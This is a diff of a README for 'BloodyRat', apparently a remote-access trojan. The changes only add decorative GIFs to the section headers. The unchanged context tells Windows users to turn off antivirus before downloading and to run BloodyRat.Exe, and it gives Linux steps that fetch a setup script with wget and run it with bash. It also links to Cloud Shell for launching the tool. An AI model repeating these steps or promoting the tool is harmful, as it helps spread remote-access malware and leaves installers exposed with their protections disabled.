@@ -52,7 +52,7 @@ Windows 10 | Supported
 Linux kali,ubuntu,Parrot | Supported
 Android | Support
 
-### Windows
+### Windows <img src="https://media.giphy.com/media/l2ECXx80AOmXK/giphy.gif" alt="Instagram" width="50" height="30" >
 <p style="color: #FD1C03;"> ⚠️ Turn off Antivirus Before Downloading Zip File ⚠️ </p>
 
 #### Prerequisite:- **Java 8** , **Node.js**
@@ -69,7 +69,7 @@ Android | Support
 
 ##### <p style="color:#29fa14;"> Step 5 : Run BloodyRat.Exe
 ---
-### Linux
+### Linux <img src="https://tenor.com/view/mr-free-super-tux-alphacron-fly-gif-14907503.gif" alt="Instagram" width="80" height="50" >
 #### <p align="center"> ```wget -N https://github.com/Bhaviktutorials/BloodyRat/raw/main/setup```
 #### <p align="center"> ``` bash setup```
 
@@ -84,9 +84,9 @@ Android | Support
 | <p align="center">  | <p align="center"> --fix -java_version   | <p align="center"> Fix java Version to 1.8.0 |
 ---
 
-### Android
+### Android <img src="https://tenor.com/view/droidcon-synesthesia-android-gif-18815626.gif" alt="Instagram" width="80" height="50" >
 ---
-### Cloud Shell
+### Cloud Shell <img src="https://tenor.com/view/sky-cloud-airspace-art-logo-gif-16713393.gif" alt="Instagram" width="80" height="50" >
 ## <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/Bhaviktutorials/BloodyRat&tutorial=README.md)
 
 ## <p align="center"> Workflow ⚙️
@@ -117,3 +117,4 @@ Android | Support
 <a href="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ"><img src="https://user-images.githubusercontent.com/64035221/96456596-4f238e00-123c-11eb-821e-85e9aaa3faec.png" alt="YouTube" width="80" height="80">
 <a href="https://t.me/bhaviktutorial"><img src="https://user-images.githubusercontent.com/64035221/113977119-b91e0700-985f-11eb-9418-eab91ff1540e.png" alt="Telegram" width="80" height="">
 <a href="https://www.instagram.com/bhavik_tutorials/"><img src="https://user-images.githubusercontent.com/64035221/113977904-e61ee980-9860-11eb-82d1-9ebd795c8138.png" alt="Instagram" width="80" height="">
+{"mode":"full","isActive":false}
